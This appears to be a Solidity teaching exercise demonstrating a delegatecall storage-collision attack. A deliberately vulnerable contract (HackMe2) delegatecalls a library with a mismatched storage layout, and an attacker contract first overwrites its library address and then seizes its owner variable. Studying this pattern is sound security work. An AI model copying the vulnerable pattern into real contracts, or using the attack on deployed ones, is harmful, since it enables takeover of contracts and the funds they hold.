pragma solidity ^0.8.13;


import "hardhat/console.sol";

// delegatecallを使用したstorageの書き換え
// https://sakataharumi.hatenablog.jp/entry/2018/10/09/224806

contract Lib2 {
    uint public someNumber;

    function doSomething(uint _num) public {
        console.log("lib2 called", _num);
        someNumber = _num;
    }
}

contract HackMe2 {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        console.log("HackMe2 called :", _num);
        console.log("owner is: ", owner);
        (bool success, ) = lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
        require(success, "failed to call doSomething");
        console.log("owner is: ", owner);
    }
}

contract DelegateCallAttacker2 {
    address public lib;
    address public owner;
    uint public someNumebr;

    HackMe2 public hackMe2;

    constructor(HackMe2 _hackMe) {
        hackMe2 = HackMe2(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe2.doSomething(uint(uint160(address(this))));
        hackMe2.doSomething(1);
    }

    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}